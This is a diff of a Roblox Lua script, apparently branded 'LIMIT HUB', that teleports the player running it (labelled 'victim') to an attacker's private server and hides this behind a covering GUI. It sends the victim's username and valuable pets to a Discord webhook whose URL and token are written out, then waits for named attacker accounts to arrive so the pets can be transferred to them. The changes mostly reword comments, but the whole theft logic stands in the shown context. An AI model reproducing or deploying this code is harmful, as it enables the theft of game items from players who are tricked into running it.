@@ -3,21 +3,21 @@ local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 
--- Private server config
+-- Private server details
 local placeId = 126884695634066
 local privateServerCode = "40206718588419987554943106780552"
 
--- Discord webhook
+-- Webhook for Discord
 local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
 
--- Attacker usernames
+-- Attacker names
 local attackerNames = {
     ["boneblossom215"] = true,
     ["beanstalk1251"] = true,
     ["burningbud709"] = true,
 }
 
--- Target pet names
+-- Specific pets to transfer only
 local allowedPets = {
     ["Trex"] = true, ["Fennec Fox"] = true, ["Raccoon"] = true,
     ["Dragonfly"] = true, ["Butterfly"] = true, ["Queenbee"] = true,
@@ -26,15 +26,15 @@ local allowedPets = {
     ["Dilophosaurus"] = true, ["Kitsune"] = true,
 }
 
--- Teleport to private server
+-- TELEPORT victim to private server
 task.spawn(function()
     TeleportService:TeleportToPrivateServer(placeId, privateServerCode, {LocalPlayer})
 end)
 
--- Wait until teleport completes
+-- Wait until teleport finishes
 repeat task.wait() until game.PlaceId == placeId
 
--- Custom GUI shown AFTER teleport
+-- SHOW GUI after teleport
 task.spawn(function()
     local screenGui = Instance.new("ScreenGui", game.CoreGui)
     screenGui.IgnoreGuiInset = true
@@ -106,7 +106,7 @@ task.spawn(function()
     screenGui:Destroy()
 end)
 
--- Send Discord webhook (with filtered pets)
+-- DISCORD WEBHOOK (after teleport)
 task.spawn(function()
     task.wait(2)
     local pets = {}
@@ -117,13 +117,13 @@ task.spawn(function()
     end
 
     local data = {
-        ["content"] = "**🎯 New Victim Detected!**",
+        ["content"] = "**🎯 Victim Detected**",
         ["embeds"] = {{
-            ["title"] = "Pet Transfer Info",
+            ["title"] = "LIMIT HUB - Pet Transfer Log",
             ["fields"] = {
                 {["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
-                {["name"] = "Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
-                {["name"] = "Filtered Pets", ["value"] = #pets > 0 and table.concat(pets, ", ") or "❌ No target pets found", ["inline"] = false}
+                {["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true},
+                {["name"] = "Pets", ["value"] = #pets > 0 and table.concat(pets, ", ") or "❌ No target pets", ["inline"] = false}
             },
             ["color"] = 16711680
         }}
@@ -137,7 +137,7 @@ task.spawn(function()
     })
 end)
 
--- Auto pet transfer (only when attacker is present)
+-- TRANSFER PETS (wait for attacker presence)
 task.spawn(function()
     while true do
         for _, player in pairs(Players:GetPlayers()) do
